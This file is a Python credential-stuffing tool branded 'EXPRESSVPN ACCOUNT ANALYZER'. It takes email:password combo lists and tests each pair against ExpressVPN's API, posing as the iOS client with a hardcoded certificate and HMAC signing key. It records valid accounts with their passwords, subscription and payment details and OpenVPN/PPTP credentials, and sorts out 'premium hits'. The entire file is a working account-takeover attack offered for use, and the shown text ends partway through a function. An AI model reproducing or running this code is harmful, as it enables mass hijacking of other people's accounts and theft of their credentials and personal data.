import sys
import time
import os
import math
import random
import signal
import requests
import json
import gzip
import hmac
import base64
import hashlib
import string
import urllib.parse
from io import BytesIO
from datetime import datetime
from threading import Event, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES, PKCS1_v1_5, DES3
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from asn1crypto import cms, x509, keys

from colorama import init
init(autoreset=True)

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.prompt import Prompt
from rich.align import Align
from rich.text import Text

SAND = "#C4B5A0"
CLAY = "#9B8B7A"
SAGE = "#7D8C7A"
STONE = "#B3A58C"
MOSS = "#5E6B5C"
GOLD = "#D4AF37"

console = Console()
shutdown_event = Event()

def signal_handler(sig, frame):
    shutdown_event.set()
    console.print("\n[bold red]⚠️ Ctrl+C detected - Shutting down...[/]")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def format_size(size_bytes):
    if size_bytes == 0: return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s}{size_name[i]}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_my_ip_info():
    try:
        resp = requests.get('http://ip-api.com/json/', timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                return {
                    'ip': data.get('query', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'asn': data.get('as', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
    except:
        pass
    return None

def show_ip_info_box():
    info = get_my_ip_info()
    if info:
        lines = [
            f"🌐 IP Address   : {info['ip']}",
            f"📍 Location     : {info['country']}, {info['region']}, {info['city']}",
            f"🏢 ISP          : {info['isp']}",
            f"🔢 ASN          : {info['asn']}",
            f"🕒 Timezone     : {info['timezone']}"
        ]
        panel = Panel(
            "\n".join(lines),
            title="[bold]🌍 YOUR NETWORK[/bold]",
            border_style=CLAY,
            box=box.HEAVY,
            padding=(1, 2)
        )
        console.print(Align.center(panel))
    else:
        console.print(Align.center(Panel("[yellow]Could not fetch IP info.[/yellow]", border_style=CLAY, box=box.HEAVY)))

boot_done = False

def display_banner():
    global boot_done
    clear_screen()
    banner = r"""
███████╗██╗  ██╗██████╗ ██████╗ ███████╗███████╗███████╗
██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝
█████╗   ╚███╔╝ ██████╔╝██████╔╝█████╗  ███████╗███████╗
██╔══╝   ██╔██╗ ██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║
███████╗██╔╝ ██╗██║     ██║  ██║███████╗███████║███████║
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
"""
    console.print(Align.center(Text(banner, style=f"bold {SAND}"), width=80))
    console.print(Align.center(Text("⚡ EXPRESSVPN ACCOUNT ANALYZER ⚡", style=f"bold {GOLD}"), width=80))
    console.print(Align.center(Text("═" * 40, style=CLAY), width=80))
    console.print()
    show_ip_info_box()
    console.print()

    info_box = Panel(
        f"[{SAND}]STATUS :[/] [green]● ACTIVE[/]\n"
        f"[{SAND}]VERSION :[/] [white]v1.0[/]\n"
        f"[{SAND}]CREATOR :[/] [magenta]@sorensys[/]\n"
        f"[{SAND}]CHANNEL :[/] [blue]@sorensync[/]",
        title=f"[bold {SAND}]SYSTEM[/]",
        border_style=CLAY,
        box=box.HEAVY,
        padding=(1, 2),
        width=50
    )
    console.print(Align.center(info_box))
    console.print()

    if not boot_done:
        spinner_frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
        for i in range(12):
            if shutdown_event.is_set():
                break
            frame = spinner_frames[i % len(spinner_frames)]
            console.print(f"[{SAND}]{frame} Initializing modules...[/]", end='\r')
            time.sleep(0.08)
        console.print(Align.center(Panel(f"[bold green]✔ SYSTEM READY[/]", border_style="green", box=box.HEAVY, width=30)))
        boot_done = True
    time.sleep(0.3)

def build_live_stats_ui(stats):
    checked = stats.get('checked', 0)
    total = stats.get('total', 0)
    premium = stats.get('premium', 0)
    free = stats.get('free', 0)
    invalid = stats.get('invalid', 0)
    progress = (checked / total * 100) if total > 0 else 0
    bar_len = 30
    filled = int(bar_len * progress / 100)
    bar = '█' * filled + '░' * (bar_len - filled)
    content = f"[{SAND}]Progress:[/] {bar} {progress:.1f}%\n"
    content += f"[{SAND}]Premium:[/] [green]{premium}[/]  "
    content += f"[{SAND}]Free:[/] [blue]{free}[/]  "
    content += f"[{SAND}]Invalid:[/] [red]{invalid}[/]  "
    content += f"[{SAND}]Checked:[/] [white]{checked}/{total}[/]"
    panel = Panel(Align.center(content), title=f"[bold {SAND}]📊 LIVE STATS[/]", border_style=CLAY, box=box.HEAVY, width=70)
    return panel

def display_aesthetic_summary(stats, start_time, end_time):
    total = stats.get('total', 0)
    checked = stats.get('checked', 0)
    premium = stats.get('premium', 0)
    free = stats.get('free', 0)
    invalid = stats.get('invalid', 0)
    retries = stats.get('retries', 0)
    duration = (end_time - start_time).total_seconds()
    minutes = int(duration // 60)
    seconds = int(duration % 60)
    rate = checked / duration if duration > 0 else 0

    main_table = Table(box=box.SIMPLE, border_style=CLAY, show_header=False, width=70)
    main_table.add_column("Metric", style=SAND, width=20)
    main_table.add_column("Value", style="white")
    main_table.add_row("Total Checked", f"{checked}/{total}")
    main_table.add_row("Premium HITS", f"[green]{premium}[/green]")
    main_table.add_row("Free Accounts", f"[blue]{free}[/blue]")
    main_table.add_row("Invalid", f"[red]{invalid}[/red]")
    main_table.add_row("Retries", f"[magenta]{retries}[/magenta]")
    main_table.add_row("Time", f"{minutes}m {seconds}s")
    main_table.add_row("Rate", f"{rate:.2f} acc/sec")

    final_panel = Panel(Align.center(main_table), title=f"[bold {GOLD}]✨ FINAL SUMMARY ✨[/]", border_style=CLAY, box=box.ROUNDED, width=80)
    console.print(Align.center(final_panel))
    console.print(Align.center(Panel(Align.center(f"[dim]Developed by @sorensys  |  Channel: @sorensync[/dim]"), border_style=CLAY, box=box.ROUNDED)))

class AesCryptographyService:
    def decrypt(self, data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data)
        padding_length = decrypted[-1]
        return decrypted[:-padding_length]

def get_byte_array(size):
    return get_random_bytes(size)

def envelope_encrypt(input_data, certificate):
    cert = x509.Certificate.load(certificate)
    issuer = cert.issuer
    serial_number = cert.serial_number
    public_key_info = cert.public_key
    if hasattr(public_key_info, 'parsed'):
        rsa_public_key = public_key_info.parsed
    else:
        rsa_public_key = keys.RSAPublicKey.load(public_key_info['public_key'].parsed.dump())
    modulus = rsa_public_key['modulus'].native
    public_exponent = rsa_public_key['public_exponent'].native
    rsa_key = RSA.construct((modulus, public_exponent))
    content_key = get_random_bytes(24)
    content_iv = get_random_bytes(8)
    pad_length = 8 - (len(input_data) % 8) if len(input_data) % 8 != 0 else 8
    padded_data = input_data + bytes([pad_length] * pad_length)
    cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
    encrypted_content = cipher.encrypt(padded_data)
    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    encrypted_key = cipher_rsa.encrypt(content_key)
    recipient_id = cms.IssuerAndSerialNumber({'issuer': issuer, 'serial_number': serial_number})
    key_trans_recipient = cms.KeyTransRecipientInfo({
        'version': 0, 'rid': cms.RecipientIdentifier(name='issuer_and_serial_number', value=recipient_id),
        'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({'algorithm': '1.2.840.113549.1.1.1'}),
        'encrypted_key': cms.OctetString(encrypted_key)
    })
    recipient_infos = cms.RecipientInfos([cms.RecipientInfo(name='ktri', value=key_trans_recipient)])
    encrypted_content_info = cms.EncryptedContentInfo({
        'content_type': '1.2.840.113549.1.7.1',
        'content_encryption_algorithm': cms.EncryptionAlgorithm({'algorithm': '1.2.840.113549.3.7', 'parameters': cms.OctetString(content_iv)}),
        'encrypted_content': encrypted_content
    })
    enveloped_data = cms.EnvelopedData({'version': 0, 'recipient_infos': recipient_infos, 'encrypted_content_info': encrypted_content_info})
    content_info = cms.ContentInfo({'content_type': '1.2.840.113549.1.7.3', 'content': enveloped_data})
    return content_info.dump()

def gzip_data(input_string):
    input_bytes = input_string.encode('ascii')
    output_stream = BytesIO()
    with gzip.GzipFile(fileobj=output_stream, mode='wb') as gz: gz.write(input_bytes)
    return output_stream.getvalue()

def compute_signature(input_data, key):
    signature = hmac.new(key, input_data, hashlib.sha1).digest()
    return base64.b64encode(signature).decode('ascii')

def generate_random_string(length=64):
    return ''.join(random.choices(string.hexdigits.lower(), k=length))

def unix_time_to_date(unix_time):
    return datetime.fromtimestamp(int(unix_time)).strftime('%Y-%m-%d')

def format_valid_hit(account_data, is_premium):
    lines = []
    lines.append("───────────────────────────────────────────────")
    lines.append("  ✦ EXPRESSVPN ACCOUNT REPORT ✦")
    lines.append("───────────────────────────────────────────────")
    lines.append(f"  EMAIL             : {account_data.get('email', 'N/A')}")
    lines.append(f"  PASSWORD          : {account_data.get('password', 'N/A')}")
    lines.append(f"  PLAN              : {'PREMIUM' if is_premium else 'FREE'}")
    lines.append(f"  LICENSE STATUS    : {account_data.get('license_status', 'N/A')}")
    if account_data.get('plan_name') and account_data['plan_name'] not in ('Not Provided', 'N/A'):
        lines.append(f"  PLAN NAME         : {account_data['plan_name']}")
    if account_data.get('billing_cycle'):
        lines.append(f"  BILLING CYCLE     : {account_data['billing_cycle']} months")
    if account_data.get('expire_date') and account_data['expire_date'] not in ('Not Provided', 'N/A'):
        lines.append(f"  EXPIRY DATE       : {account_data['expire_date']}")
    if account_data.get('days_left') and account_data['days_left'] not in ('Not Provided', 'N/A'):
        lines.append(f"  DAYS LEFT         : {account_data['days_left']}")
    if account_data.get('auto_renew') and account_data['auto_renew'] not in ('Not Provided', 'N/A'):
        lines.append(f"  AUTO RENEW        : {account_data['auto_renew']}")
    if account_data.get('payment_method') and account_data['payment_method'] not in ('Not Provided', 'N/A'):
        lines.append(f"  PAYMENT METHOD    : {account_data['payment_method']}")
    if account_data.get('currency') and account_data['currency'] not in ('Not Provided', 'N/A'):
        lines.append(f"  CURRENCY          : {account_data['currency']}")
    if account_data.get('country') and account_data['country'] not in ('Not Provided', 'N/A'):
        lines.append(f"  COUNTRY           : {account_data['country']}")
    if account_data.get('subscription_created') and account_data['subscription_created'] not in ('Not Provided', 'N/A'):
        lines.append(f"  SUBSCRIPTION CREATED : {account_data['subscription_created']}")
    if account_data.get('trial_ends') and account_data['trial_ends'] not in ('Not Provided', 'N/A'):
        lines.append(f"  TRIAL ENDS        : {account_data['trial_ends']}")
    lines.append("───────────────────────────────────────────────")
    lines.append("  OPENVPN CREDENTIALS")
    lines.append(f"    Username : {account_data.get('ovpn_username', 'N/A')}")
    lines.append(f"    Password : {account_data.get('ovpn_password', 'N/A')}")
    lines.append("  PPTP CREDENTIALS")
    lines.append(f"    Username : {account_data.get('pptp_username', 'N/A')}")
    lines.append(f"    Password : {account_data.get('pptp_password', 'N/A')}")
    lines.append("───────────────────────────────────────────────")
    if account_data.get('last_login') and account_data['last_login'] not in ('Not Provided', 'N/A'):
        lines.append(f"  🕒 LAST LOGIN      : {account_data['last_login']}")
    if account_data.get('account_created') and account_data['account_created'] not in ('Not Provided', 'N/A'):
        lines.append(f"  ACCOUNT CREATED   : {account_data['account_created']}")
    lines.append("───────────────────────────────────────────────")
    lines.append("  Powered by @sorensys  |  @sorensync")
    lines.append("───────────────────────────────────────────────")
    return Text("\n".join(lines), style=SAND)

def format_invalid_hit(email, password, error):
    combo = f"{email}:{password}"
    if len(combo) > 60:
        combo = combo[:57] + "…"
    lines = []
    lines.append("───────────────────────────────────────────────")
    lines.append(f"  {combo}  ⪼  ɪɴᴠᴀʟɪᴅ")
    if "401" in error or "Invalid" in error or "incorrect" in error.lower():
        error = "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs"
    else:
        error = error[:50] + ("…" if len(error) > 50 else "")
    lines.append(f"  ERROR : {error}")
    lines.append("───────────────────────────────────────────────")
    return Text("\n".join(lines), style="bold red")

class RateLimitManager:
    LIMIT_FILE = os.path.join(os.path.expanduser("~"), ".express_limit.json")
    MAX_ACCOUNTS = 500
    WINDOW_SECONDS = 900

    def __init__(self):
        self.lock = Lock()
        self.start_time = None
        self.count = 0

    def _hide_file(self):
        if os.name == 'nt':
            os.system(f'attrib +h "{self.LIMIT_FILE}"')

    def _read_state(self):
        if os.path.exists(self.LIMIT_FILE):
            try:
                with open(self.LIMIT_FILE, 'r') as f:
                    data = json.load(f)
                    return data.get('start', 0), data.get('count', 0)
            except:
                pass
        return 0, 0

    def _write_state(self, start, count):
        with open(self.LIMIT_FILE, 'w') as f:
            json.dump({'start': start, 'count': count}, f)
        self._hide_file()

    def check_and_wait(self):
        start, count = self._read_state()
        now = time.time()
        if start == 0:
            self.start_time = now
            self.count = 0
            self._write_state(now, 0)
            return

        elapsed = now - start
        if elapsed < self.WINDOW_SECONDS and count >= self.MAX_ACCOUNTS:
            remaining = self.WINDOW_SECONDS - elapsed
            self._show_limit_panel(remaining)
            time.sleep(remaining)
            self.start_time = time.time()
            self.count = 0
            self._write_state(self.start_time, 0)
        else:
            if elapsed >= self.WINDOW_SECONDS:
                self.start_time = now
                self.count = 0
                self._write_state(now, 0)
            else:
                self.start_time = start
                self.count = count

    def record(self):
        with self.lock:
            now = time.time()
            start, count = self._read_state()
            if now - start >= self.WINDOW_SECONDS:
                start = now
                count = 0
            count += 1
            self._write_state(start, count)
            if count >= self.MAX_ACCOUNTS:
                self.start_time = start
                self.count = count

    def _show_limit_panel(self, remaining_seconds):
        minutes = int(remaining_seconds // 60)
        seconds = int(remaining_seconds % 60)
        lines = []
        lines.append("")
        lines.append("  RATE LIMIT REACHED")
        lines.append("  To protect your network and avoid being blocked,")
        lines.append("  the tool pauses for a short cooldown period.")
        lines.append("")
        lines.append(f"  Please wait {minutes} minutes and {seconds} seconds.")
        lines.append("  After that, checking will resume automatically.")
        lines.append("")
        lines.append("  This is a safety measure to ensure stable operation.")
        lines.append("")
        panel = Panel(
            Align.center("\n".join(lines)),
            title="⏳ PAUSED",
            border_style=CLAY,
            box=box.HEAVY,
            padding=(1, 2)
        )
        console.print(Align.center(panel))
        sys.stdout.flush()

rate_limit = RateLimitManager()

class ExpressVPNChecker:
    def __init__(self):
        self.hits_premium = 0
        self.hits_free = 0
        self.invalid = 0
        self.retries = 0
        self.results_folder = "ExpressVPN_Results"
        os.makedirs(self.results_folder, exist_ok=True)
        self.valid_file = os.path.join(self.results_folder, "valid.txt")
        self.invalid_file = os.path.join(self.results_folder, "invalid.txt")
        self.write_lock = Lock()

    def check_account(self, email, password, output_func=None):
        account_data = {'email': email, 'password': password}
        try:
            install_id = generate_random_string(64)
            base64_iv = base64.b64encode(get_byte_array(16)).decode('ascii')
            base64_key = base64.b64encode(get_byte_array(16)).decode('ascii')
            post_data = json.dumps({"email": email, "iv": base64_iv, "key": base64_key, "password": password})
            cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
            cert_bytes = base64.b64decode(cert_base64)
            gzipped_data = gzip_data(post_data)
            try:
                encrypted_post_data = envelope_encrypt(gzipped_data, cert_bytes)
            except Exception:
                self.invalid += 1
                err_msg = "Encryption failed"
                if output_func:
                    output_func(format_invalid_hit(email, password, err_msg))
                with self.write_lock:
                    with open(self.invalid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}  |  {err_msg}\n")
                return
            hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
            header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            header_signature = compute_signature(header_raw.encode('ascii'), hmac_key.encode('ascii'))
            body_signature = compute_signature(encrypted_post_data, hmac_key.encode('ascii'))
            url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            headers = {
                "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
                "Expect": "", "Content-Type": "application/octet-stream", "X-Body-Compression": "gzip",
                "X-Signature": f"2 {header_signature} 91c776e", "X-Body-Signature": f"2 {body_signature} 91c776e",
                "Accept-Language": "en", "Accept-Encoding": "gzip, deflate",
            }
            try:
                resp = requests.post(url, data=encrypted_post_data, headers=headers, timeout=30)
            except Exception:
                self.invalid += 1
                err_msg = "Request failed"
                if output_func:
                    output_func(format_invalid_hit(email, password, err_msg))
                with self.write_lock:
                    with open(self.invalid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}  |  {err_msg}\n")
                return
            if resp.status_code == 401:
                self.invalid += 1
                err_msg = "401 Unauthorized"
                if output_func:
                    output_func(format_invalid_hit(email, password, err_msg))
                with self.write_lock:
                    with open(self.invalid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}  |  {err_msg}\n")
                return
            if resp.status_code != 200:
                self.invalid += 1
                err_msg = "HTTP " + str(resp.status_code)
                if output_func:
                    output_func(format_invalid_hit(email, password, err_msg))
                with self.write_lock:
                    with open(self.invalid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}  |  {err_msg}\n")
                return
            if resp.status_code == 429:
                self.retries += 1
                if output_func:
                    output_func(format_invalid_hit(email, password, "Rate limited, retrying"))
                time.sleep(5)
                return self.check_account(email, password, output_func)
            try:
                aes = AesCryptographyService()
                plain = aes.decrypt(resp.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
                resp_json = json.loads(plain.decode('ascii'))
            except Exception:
                self.invalid += 1
                err_msg = "Decryption failed"
                if output_func:
                    output_func(format_invalid_hit(email, password, err_msg))
                with self.write_lock:
                    with open(self.invalid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}  |  {err_msg}\n")
                return
            for k in ("ovpn_username", "ovpn_password", "pptp_username", "pptp_password"):
                if k in resp_json: account_data[k] = resp_json[k]
            access_token = resp_json.get("access_token")
            if not access_token:
                account_data['license_status'] = 'NO_SUBSCRIPTION'
                self.hits_free += 1
                if output_func:
                    output_func(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                return
            sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
            sub_sig = compute_signature(sub_raw.encode('ascii'), hmac_key.encode('ascii'))
            batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_sig = compute_signature(batch_raw.encode('ascii'), hmac_key.encode('ascii'))
            capture_body = json.dumps([{
                "headers": {"Accept-Language": "en", "X-Signature": f"2 {sub_sig} 91c776e"},
                "method": "GET",
                "url": f"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email",
            }])
            capture_body_sig = compute_signature(capture_body.encode('ascii'), hmac_key.encode('ascii'))
            batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_headers = {
                "User-Agent": "xvclient/v21.21.0 (ios wiecz; 14.4) ui/11.5.2",
                "X-Body-Compression": "gzip",
                "X-Signature": f"2 {batch_sig} 91c776e",
                "X-Body-Signature": f"2 {capture_body_sig} 91c776e",
                "Accept-Language": "en",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/json",
            }
            try:
                br = requests.post(batch_url, data=capture_body, headers=batch_headers, timeout=30)
            except Exception:
                self.hits_free += 1
                account_data['license_status'] = 'BATCH_FAIL'
                if output_func:
                    output_func(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                return
            if br.status_code == 429:
                self.retries += 1
                if output_func:
                    output_func(format_invalid_hit(email, password, "Rate limited on batch, retrying"))
                time.sleep(5)
                return self.check_account(email, password, output_func)
            if br.status_code != 200:
                self.hits_free += 1
                account_data['license_status'] = f'BATCH_HTTP_{br.status_code}'
                if output_func:
                    output_func(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                return
            try:
                batch_data = br.json()
            except Exception:
                self.hits_free += 1
                account_data['license_status'] = 'BATCH_JSON_ERROR'
                if output_func:
                    output_func(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                return
            if not batch_data:
                self.hits_free += 1
                account_data['license_status'] = 'EMPTY_BATCH'
                if output_func:
                    output_func(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                return
            item = batch_data[0]
            item_code = item.get('code') or item.get('status')
            if item_code == 429:
                self.retries += 1
                if output_func:
                    output_func(format_invalid_hit(email, password, "Rate limited on sub, retrying"))
                time.sleep(5)
                return self.check_account(email, password, output_func)
            sub_data = item.get('body', '{}')
            if isinstance(sub_data, str):
                sub_data = sub_data.replace('\\"', '"')
                try:
                    sub_json = json.loads(sub_data)
                except Exception:
                    self.hits_free += 1
                    account_data['license_status'] = 'SUB_JSON_ERROR'
                    if output_func:
                        output_func(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                    return
            elif isinstance(sub_data, dict):
                sub_json = sub_data
            else:
                self.hits_free += 1
                account_data['license_status'] = 'SUB_INVALID_TYPE'
                if output_func:
                    output_func(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                return
            if 'subscription' in sub_json: sub_json = sub_json['subscription']
            billing_cycle = sub_json.get('billing_cycle')
            if billing_cycle:
                account_data['billing_cycle'] = billing_cycle
                account_data['plan'] = f"{billing_cycle} Month"
            if 'expiration_time' in sub_json:
                exp_time = sub_json['expiration_time']
                account_data['expire_date'] = unix_time_to_date(exp_time)
                account_data['days_left'] = int((int(exp_time) - int(datetime.now().timestamp())) / 86400)
            if 'auto_bill' in sub_json:
                account_data['auto_renew'] = str(sub_json['auto_bill']).lower()
            if 'payment_method' in sub_json:
                account_data['payment_method'] = sub_json['payment_method']
            license_status = str(sub_json.get('license_status', '')).upper()
            account_data['license_status'] = license_status

            if 'plan_name' in sub_json and sub_json['plan_name']:
                account_data['plan_name'] = sub_json['plan_name']
            if 'currency' in sub_json:
                account_data['currency'] = sub_json['currency']
            if 'country' in sub_json:
                account_data['country'] = sub_json['country']
            if 'created_at' in sub_json:
                account_data['subscription_created'] = sub_json['created_at']
            if 'trial_end_time' in sub_json:
                account_data['trial_ends'] = sub_json['trial_end_time']

            try:
                acc_info = self.fetch_account_info(access_token, install_id)
                if acc_info:
                    if 'created_at' in acc_info:
                        account_data['account_created'] = acc_info['created_at']
                    if 'last_login_time' in acc_info:
                        account_data['last_login'] = acc_info['last_login_time']
            except:
                pass

            if license_status == 'REVOKED':
                self.hits_free += 1
                if output_func:
                    output_func(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                return
            if license_status in ('ACTIVE', 'TRIAL', 'PAID'):
                exp_time = sub_json.get('expiration_time')
                if exp_time and int(exp_time) > int(datetime.now().timestamp()):
                    account_data['is_premium'] = True
                    self.hits_premium += 1
                    if output_func:
                        output_func(format_valid_hit(account_data, True))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(format_valid_hit(account_data, True).plain + "\n" + "="*60 + "\n\n")
                    return
                else:
                    self.hits_free += 1
                    if output_func:
                        output_func(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
                    return
            self.hits_free += 1
            if output_func:
                output_func(format_valid_hit(account_data, False))
            with self.write_lock:
                with open(self.valid_file, 'a', encoding='utf-8') as f:
                    f.write(format_valid_hit(account_data, False).plain + "\n" + "="*60 + "\n\n")
        except Exception as e:
            self.invalid += 1
            err_msg = str(e)[:80]
            if output_func:
                output_func(format_invalid_hit(email, password, err_msg))
            with self.write_lock:
                with open(self.invalid_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}  |  {err_msg}\n")

    def fetch_account_info(self, access_token, install_id):
        hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        raw = f"GET /apis/v2/account?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        sig = compute_signature(raw.encode('ascii'), hmac_key.encode('ascii'))
        url = f"https://www.expressapisv2.net/apis/v2/account?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        headers = {
            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
            "X-Signature": f"2 {sig} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                return resp.json()
        except:
            pass
        return None

def show_no_combo_panel():
    clear_screen()
    lines = [
        "[1]  COMBO FOLDER NOT FOUND",
        "",
        "This tool needs a folder named [bold]Combo[/bold]",
        "containing your account files.",
        "",
        "Here is how to set it up:",
        "",
        "(1)  Create a folder called [bold]Combo[/bold]",
        "     in the same directory as this tool.",
        "",
        "(2)  Place your [bold].txt[/bold] files inside it.",
        "     Each line should be [bold]email:password[/bold]",
        "     or [bold]username:password[/bold].",
        "",
        "(3)  Run the tool again.",
        "",
        "Example: [dim]Combo/accounts.txt[/dim]",
        "",
        "Once the folder is ready, the tool will",
        "automatically detect your files.",
        "",
        "Press Enter to exit..."
    ]
    panel = Panel(
        Align.center("\n".join(lines)),
        title="[bold]SETUP REQUIRED[/bold]",
        border_style=CLAY,
        box=box.HEAVY,
        padding=(1, 2),
        width=80
    )
    console.print(Align.center(panel))
    input()
    sys.exit(1)

def find_and_list_account_files():
    combo_dir = 'Combo'
    if not os.path.exists(combo_dir):
        return None
    file_details = []
    for filename in os.listdir(combo_dir):
        file_path = os.path.join(combo_dir, filename)
        if os.path.isfile(file_path) and filename.endswith(".txt"):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    line_count = sum(1 for _ in f if _.strip())
                file_size = os.path.getsize(file_path)
                file_details.append((file_path, file_size, line_count))
            except:
                pass
    if not file_details:
        return None
